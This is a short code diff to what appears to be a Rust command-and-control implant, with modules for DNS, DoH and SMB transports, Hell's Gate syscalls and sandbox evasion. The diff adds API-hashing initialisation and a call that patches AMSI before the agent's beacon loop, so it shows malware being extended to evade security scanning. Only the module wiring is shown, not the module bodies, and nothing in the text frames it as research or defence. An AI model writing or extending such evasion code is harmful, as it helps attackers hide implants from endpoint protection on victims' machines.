@@ -11,6 +11,7 @@ mod transport_dns;
 mod transport_doh;
 mod transport_smb;
 mod hells_gate;
+mod api_hash;
 mod commands;
 mod evasion;
 mod dotnet;
@@ -34,7 +35,9 @@ fn agent_main() {
     use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};
     use std::sync::atomic::Ordering;
     hells_gate::init();
+    api_hash::init();
     evasion::sandbox_check();
+    evasion::patch_amsi();
     let mut t = transport::AgentTransport::new();
     loop {
         t.register();
